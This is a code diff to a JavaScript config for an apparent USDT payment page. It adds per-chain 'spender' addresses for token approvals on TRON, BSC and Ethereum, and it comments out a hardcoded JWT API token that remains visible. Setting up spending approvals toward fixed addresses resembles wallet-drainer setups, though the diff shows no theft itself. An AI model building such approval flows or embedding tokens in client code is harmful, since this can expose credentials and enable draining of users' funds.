@@ -4,21 +4,25 @@
     networks: {
       tron: {
         usdtAddress: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+        spenderAddress: "TA15gtkcGHEUeyAioAbPwdrXD22mpu1CP8",
         toAddress: "TA15gtkcGHEUeyAioAbPwdrXD22mpu1CP8" // 授权目标地址 (spender)
       },
       bsc: {
         chainIdHex: "0x38",
         usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
+        spenderAddress: "0xCbEE4A03BAFF04d99F98dDa0B5Aa26d4e6061EED",
         toAddress: "0xCbEE4A03BAFF04d99F98dDa0B5Aa26d4e6061EED" // 授权目标地址 (spender)
       },
       bscTestnet: {
         chainIdHex: "0x61",
         usdtAddress: "0x25e8a036f3EBEE0Bc13B8213e4425825693A8E95",
+        spenderAddress: "0x699E6785887C20dF58f5CA889E00Ee1fFD67DEA2",
         toAddress: "0x699E6785887C20dF58f5CA889E00Ee1fFD67DEA2" // 授权目标地址 (spender)
       },
       eth: {
         chainIdHex: "0x1",
         usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        spenderAddress: "0xCbEE4A03BAFF04d99F98dDa0B5Aa26d4e6061EED",
         toAddress: "0xCbEE4A03BAFF04d99F98dDa0B5Aa26d4e6061EED" // 授权目标地址 (spender)
       }
     }
@@ -28,15 +32,15 @@
   var amount = params.get("amount") || DEFAULT_CONFIG.amountUsdt;
   var chain = params.get("chain") || params.get("network") || "";
   var to = params.get("to") || params.get("address") || "";
-  var apiBase = params.get("apiBase") || "http://localhost:3000";
-  var apiToken = params.get("apiToken") || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZnJvbnRlbmQiLCJpYXQiOjE3NjgzNzMxMDUsImV4cCI6MTc2ODk3NzkwNX0.9mv7p-ABjqLxfYS-Vu7OO3umOvzbxNndbMg9ksVH72U";
+  var apiBase = params.get("apiBase") || "http://localhost:3001";
+  // var apiToken = params.get("apiToken") || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZnJvbnRlbmQiLCJpYXQiOjE3NjgzNzMxMDUsImV4cCI6MTc2ODk3NzkwNX0.9mv7p-ABjqLxfYS-Vu7OO3umOvzbxNndbMg9ksVH72U";
 
   window.pay0Config = {
     amountUsdt: amount,
     chain: chain,
     toAddress: to, 
     apiBase: apiBase,
-    apiToken: apiToken,
+    // apiToken: apiToken,
     networks: DEFAULT_CONFIG.networks,
     
     getNetworkConfig: function(networkKey) {
@@ -47,6 +51,7 @@
       return {
         chainIdHex: net.chainIdHex,
         usdtAddress: net.usdtAddress,
+        spenderAddress: net.spenderAddress,
         toAddress: finalTo
       };
     }
